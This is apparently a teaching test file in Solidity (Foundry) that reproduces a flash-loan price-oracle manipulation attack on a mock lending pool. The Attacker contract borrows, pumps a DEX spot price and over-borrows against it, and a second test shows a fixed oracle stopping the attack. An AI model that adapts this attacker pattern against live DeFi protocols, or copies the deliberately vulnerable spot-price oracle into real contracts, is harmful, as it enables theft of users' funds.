// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/// Minimal ERC20 mock (allowance-free — throwaway demo tokens).
contract Mock {
    string public name; string public symbol; uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
    function mint(address to, uint256 a) external { balanceOf[to] += a; emit Transfer(address(0), to, a); }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; emit Transfer(msg.sender, to, a); return true; }
    function transferFrom(address f, address t, uint256 a) external returns (bool) { balanceOf[f] -= a; balanceOf[t] += a; emit Transfer(f, t, a); return true; }
}

/// Constant-product DEX pool WETH/USD. Its INSTANTANEOUS spot price is what the naive lender trusts.
contract DexPool {
    Mock public weth; Mock public usd;
    uint256 public rWeth; uint256 public rUsd;
    constructor(Mock w, Mock u) { weth = w; usd = u; }
    function seed(uint256 w, uint256 u) external { weth.transferFrom(msg.sender, address(this), w); usd.transferFrom(msg.sender, address(this), u); rWeth += w; rUsd += u; }
    function _out(uint256 aIn, uint256 rin, uint256 rout) internal pure returns (uint256) { uint256 f = aIn * 997; return f * rout / (rin * 1000 + f); }
    function buyWeth(uint256 usdIn) external returns (uint256 out) { out = _out(usdIn, rUsd, rWeth); usd.transferFrom(msg.sender, address(this), usdIn); weth.transfer(msg.sender, out); rUsd += usdIn; rWeth -= out; }
    function sellWeth(uint256 wethIn) external returns (uint256 out) { out = _out(wethIn, rWeth, rUsd); weth.transferFrom(msg.sender, address(this), wethIn); usd.transfer(msg.sender, out); rWeth += wethIn; rUsd -= out; }
    /// The manipulable oracle: USD per WETH, 1e18-scaled, straight off the current reserves.
    function spotPriceUSDPerWETH() external view returns (uint256) { return rUsd * 1e18 / rWeth; }
}

interface IOracle { function priceWETH() external view returns (uint256); }
/// VULNERABLE: reads the pool's live spot price — a single big swap moves it.
contract SpotOracle is IOracle { DexPool public pool; constructor(DexPool p){pool=p;} function priceWETH() external view returns (uint256){ return pool.spotPriceUSDPerWETH(); } }
/// FIXED: a Chainlink/TWAP-style feed a single swap can't move (here, an injected trusted price).
contract FixedOracle is IOracle { uint256 public price; constructor(uint256 p){price=p;} function priceWETH() external view returns (uint256){ return price; } }

/// Naive money market: deposit WETH, borrow USD up to collateral × oracle price. The ONLY difference
/// between the vulnerable and safe versions is which IOracle it was given.
contract LendingPool {
    Mock public weth; Mock public usd; IOracle public oracle;
    mapping(address => uint256) public collateral; mapping(address => uint256) public debt;
    constructor(Mock w, Mock u, IOracle o){ weth = w; usd = u; oracle = o; }
    function fund(uint256 a) external { usd.transferFrom(msg.sender, address(this), a); }
    function deposit(uint256 w) external { weth.transferFrom(msg.sender, address(this), w); collateral[msg.sender] += w; }
    function maxBorrow(address user) public view returns (uint256) { return collateral[user] * oracle.priceWETH() / 1e18; }
    function borrow(uint256 u) external { require(debt[msg.sender] + u <= maxBorrow(msg.sender), "undercollateralized"); debt[msg.sender] += u; usd.transfer(msg.sender, u); }
}

interface IFlashBorrower { function onFlash(uint256 amt, bytes calldata data) external; }
/// Minimal USD flash lender (must be repaid within the same tx).
contract FlashLender {
    Mock public usd;
    constructor(Mock u){ usd = u; }
    function flashLoan(uint256 amt, address borrower, bytes calldata data) external {
        uint256 pre = usd.balanceOf(address(this));
        usd.transfer(borrower, amt);
        IFlashBorrower(borrower).onFlash(amt, data);
        require(usd.balanceOf(address(this)) >= pre, "flash not repaid");
    }
}

/// Capital-free attacker: flash-borrow USD, pump the pool's spot price, over-borrow against it, repay.
contract Attacker is IFlashBorrower {
    DexPool public pool; LendingPool public lending; Mock public weth; Mock public usd; FlashLender public lender;
    uint256 public profit;
    constructor(DexPool p, LendingPool l, Mock w, Mock u, FlashLender fl){ pool = p; lending = l; weth = w; usd = u; lender = fl; }
    function attack(uint256 flashAmt, uint256 swapUsd) external {
        lender.flashLoan(flashAmt, address(this), abi.encode(swapUsd));
        profit = usd.balanceOf(address(this));
    }
    function onFlash(uint256 amt, bytes calldata data) external {
        uint256 swapUsd = abi.decode(data, (uint256));
        uint256 wethBought = pool.buyWeth(swapUsd);           // 1) pump WETH's spot price
        lending.deposit(wethBought);                          // 2) deposit the now-overpriced WETH
        uint256 avail = usd.balanceOf(address(lending));
        uint256 maxB = lending.maxBorrow(address(this));
        uint256 toBorrow = maxB < avail ? maxB : avail;
        lending.borrow(toBorrow);                             // 3) borrow the max the oracle allows
        usd.transfer(address(lender), amt);                   // 4) repay the flash loan
    }
}

contract OracleManipTest is Test {
    Mock weth; Mock usd; DexPool pool; FlashLender lender;
    function setUp() public {
        weth = new Mock("Wrapped Ether", "WETH", 18);
        usd  = new Mock("USD Coin", "USDC", 18);
        pool = new DexPool(weth, usd);
        weth.mint(address(this), 100e18); usd.mint(address(this), 200_000e18);
        pool.seed(100e18, 200_000e18);              // 100 WETH / 200,000 USD -> spot $2,000/WETH
        lender = new FlashLender(usd);
        usd.mint(address(lender), 1_000_000e18);    // flash liquidity
    }

    function _lending(IOracle o) internal returns (LendingPool l) {
        l = new LendingPool(weth, usd, o);
        usd.mint(address(this), 1_000_000e18); usd.transfer(address(l), 1_000_000e18); // $1M to lend
    }

    function test_oracle_manip() public {
        emit log_named_decimal_uint("true spot price (USD/WETH)", pool.spotPriceUSDPerWETH(), 18);
        LendingPool lending = _lending(new SpotOracle(pool));   // VULNERABLE: trusts the live spot
        Attacker atk = new Attacker(pool, lending, weth, usd, lender);
        atk.attack(1_000_000e18, 800_000e18);                   // flash $1M, spend $800k to pump

        emit log_named_decimal_uint("spot price AFTER the pump", pool.spotPriceUSDPerWETH(), 18);
        emit log_named_decimal_uint("attacker profit (USD, from $0 capital)", atk.profit(), 18);
        uint256 trueCollVal = lending.collateral(address(atk)) * 2000e18 / 1e18;
        emit log_named_decimal_uint("collateral left in pool, TRUE value (USD)", trueCollVal, 18);
        emit log_named_decimal_uint("... but the pool lent out (USD)", lending.debt(address(atk)), 18);
        assertGt(atk.profit(), 0, "attack must be profitable");
        assertLt(trueCollVal, lending.debt(address(atk)), "pool is left with bad debt");
    }

    function test_fixed() public {
        LendingPool lending = _lending(new FixedOracle(2000e18)); // SAFE: Chainlink/TWAP-style feed
        Attacker atk = new Attacker(pool, lending, weth, usd, lender);
        // The pump no longer inflates the collateral's valuation, so the attacker can't borrow enough
        // to repay the flash loan — the whole transaction reverts. Manipulation defeated.
        vm.expectRevert();
        atk.attack(1_000_000e18, 800_000e18);
    }
}
